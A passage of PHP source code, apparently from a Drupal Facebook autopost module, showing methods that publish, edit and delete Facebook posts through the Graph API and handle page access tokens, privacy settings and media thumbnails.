     * @throws FacebookApiException
     */
    protected function publishOn($publication) {
        $this->publishParameterPrepare($publication);

        // Call api method from ancestor.
        $result = $this->api(
        // Post to destination on the selected endpoint.
            '/' . $this->getDestination() . '/' . $this->getEndpoint(),
            // This is fixed.
            'POST',
            // Add access token to the params.
            $publication['params']
        );

        module_invoke_all('fb_autopost_publication_publish', $publication, $result);

        return $result;
    }

    /**
     * Prepares the parameters to publish to Facebook, this means settings any
     * field or destination dependent configuration.
     */
    protected function publishParameterPrepare(&$publication) {
        $destination = $this->getDestination();
        if ($destination != 'me') {
            $pages = self::getPagesAccessTokens(variable_get('fb_autopost_account_id', 'me'), variable_get('fb_autopost_token', ''));
            $publication['params'] += array('access_token' => $pages[$destination]['access_token']);
        }
        else {
            // Privacy only makes sense when publishing to timeline
            if ($p = $this->getPrivacy()) {
                $publication['params'] += array('privacy' => $p);
            }
        }

      $fid = $publication['params']['targeting']? $publication['params']['targeting']:'';
      unset($publication['params']['targeting']);
        if(isset($publication['params']['picture'])){
          $type = videoType($publication['params']['picture']);
          switch ($type){
            case 'soundcloud':
              $file = file_load($fid);
              $wrapper = file_stream_wrapper_get_instance_by_uri($file->uri);
              $url = file_create_url($wrapper->getLocalThumbnailPath());
              break;
            case 'facebook':
              $file = file_load($fid);
              $wrapper = file_stream_wrapper_get_instance_by_uri($file->uri);
              $url = file_create_url($wrapper->getLocalThumbnailPath());
              break;
            case 'flickr':
              $file = file_load($fid);
              $url = $file->metadata['oembed']['url'];
              break;
            default:
              $url = $publication['params']['picture'];
//              $url =video_image($publication['params']['picture']);
              break;
          }
		}else{
		  $link = $publication['params']['link'];
		  $path = preg_replace('/\//','',parse_url($link,PHP_URL_PATH),1);
		  $org_path = drupal_lookup_path("source", $path);
		  $node = menu_get_object("node", 1, $org_path);
		  $content = node_view($node);
		  $file = file_load($content['field_website_screenshot']['#items'][0]['file_id']);
		  $url = image_style_url('232x130',$file->uri);
		}
      $publication['params']['picture'] = $url;
//        print_r($publication['params']); die();
    }


    /**
     * Get access tokens for publishing to several Facebook Pages
     *
     * @param $account_id
     *   User account asked for
     * @param $account_access_token
     *   Server side access token stored from the admin form.
     * @return
     *   A keyed array indexed by page id and containing the values:
     *     - 'id': Facebook page id
     *     - 'access_token': Access token for publishing to the page
     * @throws FBAutopostException
     */
    private static function getPagesAccessTokens($account_id, $account_access_token) {
        $pages = array();
        foreach (variable_get('fb_autopost_pages_access_tokens', array()) as $page_id => $page_access_token) {
            $pages[$page_id] = array(
                'id' => $page_id,
                'access_token' => $page_access_token,
            );
        }
        return $pages;
    }

    /**
     * Gets the reply given from Facebook when asking for user account.
     * @param $account_id
     *   User account asked for
     * @param $account_access_token
     *   Server side access token stored from the admin form.
     * @return
     *   The array from the Graph API call
     * @throws FBAutopostException
     */
    public function getPagesData($account_id, $account_access_token) {
        // Check if there is an access_token available.
        if (empty($account_access_token)) {
            throw new FBAutopostException(t('Cannot ask for user accounts without an access token.'), FBAutopost::missing_param, WATCHDOG_ERROR);
        }
        try {
            return $this->api('/' . $account_id . '/accounts', 'GET', array(
                'limit' => 999,
            ));

        } catch (FacebookApiException $e) {
            // Get the FacebookApiException and throw an ordinary
            // FBAutopostException
            throw new FBAutopostException(t('Facebook SDK threw an error: %error It is possible that your Facebook account cannot access the configured pages, if so please log in again in !url.', array('%error' => $e, '!url' => l(t('Facebook autopost configuration page'), 'admin/config/services/fbautopost'))), FBAutopost::sdk_error, WATCHDOG_ERROR);
        }
    }

    /**
     * Set the destination to publish to
     *
     * @param $destination
     * @return
     *   Returns itsef for chainable code.
     */
    public function setDestination($destination) {
        $this->destination = $destination;
        return $this;
    }

    /**
     * Gets the destination to publish to
     *
     * @return
     *   The destination parameter
     */
    public function getDestination() {
        return $this->destination;
    }

    /**
     * Deletes a publication from Facebook
     *
     * @param $publication_id
     *   The id that identifies the publication in Facebook
     * @throws FacebookApiException
     */
    public function remoteDelete($publication_id) {
        // TODO: Add a remoetDelete callback to the entity delete (optional)
        $this->api('/' . $publication_id, 'DELETE');
        // If request fails then an exception is thrown and there is no return value
        return TRUE;
    }

    /**
     * Edits a publication from Facebook
     *
     * @param $publication
     *   Keyed array containing the info for the publication. Must contain the
     *   keys:
     *     - 'type': The publication type as defined in $publication_types
     *     - 'params': Associative array with the necessary params for a
     *                 successful FB publication
     * @param $publication_id
     *   The id that identifies the publication in Facebook
     */
    public function remoteEdit($publication, $publication_id) {
        // In this case, edit means delete + publish. This has the side effect that
        // the ID is not preserved.
        if ($this->remoteDelete($publication)) {
            return $this->publish($publication);
        }
    }

    /**
     * Gets the session object for sugar syntax. Factory method.
     *
     * @return FBSession
     */
    public function getSession() {
        return new FBSession();
    }

    /**
     * Sets the privacy.
     *
     * @param string $privacy_code
     *   Privacy string as defined in Facebook documentation. Allowed values are:
     *     - EVERYONE
     *     - ALL_FRIENDS
     *     - FRIENDS_OF_FRIENDS
     *     - SELF
     * @return $this
     *   Returns itself.
     * @throws FBAutopostException
     * @see https://developers.facebook.com/docs/reference/api/privacy-parameter
     */
    public function setPrivacy($privacy_code) {
        if (!in_array($privacy_code, array('ALL_FRIENDS', 'EVERYONE', 'SELF', 'FRIENDS_OF_FRIENDS'))) {
            throw new FBAutopostException(t('The privacy code you specified is invalid.'), FBAutopost::incorrect_param, WATCHDOG_ERROR);
        }
        $this->privacy = $privacy_code;
        return $this;
    }

    /**
     * Gets the privacy value.
     *
     * @return string
     *   The privacy array formatted as array('value' => 'ALL_FRIENDS') …
     * @see https://developers.facebook.com/docs/reference/api/privacy-parameter/
     * @todo Better handling of the privacy
     */
    public function getPrivacy() {
        return isset($this->privacy) ? array('value' => $this->privacy) : NULL;
    }

    /**
     * Sets the type value.
     *
     * @param string $type
     *   The type as defined in FBAutopost::types.
     *
     * @throws FBAutopostException
     *
     * @return FBAutopost
     *   Returns itself
     */
    public function setType($type) {
        if (!in_array($type, array_keys($this->publication_types))) {
            throw new FBAutopostException(t('The publication type you specified is invalid.'), FBAutopost::incorrect_param, WATCHDOG_ERROR);
        }
        $this->type = $type;
        return $this;
    }

    /**
     * Gets the publication type.
     *
     * @return string
     *   The publication type.
     */
    protected function getType() {
        return $this->type;
    }

    /**
     * Throws an exception if the selected page id is not among the authorized
     * ones.
     */
    private function checkPagesAvailability() {
        $page_id = $this->getDestination();
        // Get fresh access tokens for the pages. We use the server side access
        // token and the account ID to retrieve them
        $pages = self::getPagesAccessTokens(variable_get('fb_autopost_account_id', 'me'), variable_get('fb_autopost_token', ''));
        // Check that the selected page is in the available list.
        if (!in_array($page_id, array_keys($pages)) && $page_id != 'me') {
            throw new FBAutopostException(t('Insufficient permissions to publish on page with id @id. Please check !config.', array('@id' => $page_id, '!config' => l(t('your configuration'), 'admin/config/services/fbautopost'))), FBAutopost::incorrect_param, WATCHDOG_ERROR);
        }
    }

    /**
     * Checks if a user has an active access token.
     *
     * @return boolean
     *   TRUE if the user may publish to the timeline.
     */
    public function hasActiveAccessToken() {
        $access_token = FALSE;
        foreach ($_SESSION as $key => $value) {
            if (preg_match("/fb_\d+_access_token/", $key)) {
                $access_token = $value;
                break;
            }
        }
        // This is to make sure the access token is not gotten from the app.
        return $this->getAccessToken() == $access_token;
    }

    /**
     * Sets the retry value.
     *
     * @param boolean $retry
     *   Boolean indicating if the publication in the timeline must be retried.
     *
     * @return FBAutopost
     *   Returns itself
     */
    public function setRetry($retry) {
        $this->retry = $retry;
        return $this;
    }

    /**
     * Gets the publication type.
     *
     * @return boolean
     *   The retry settings.
     */
    protected function getRetry() {
        return $this->retry;
    }
}
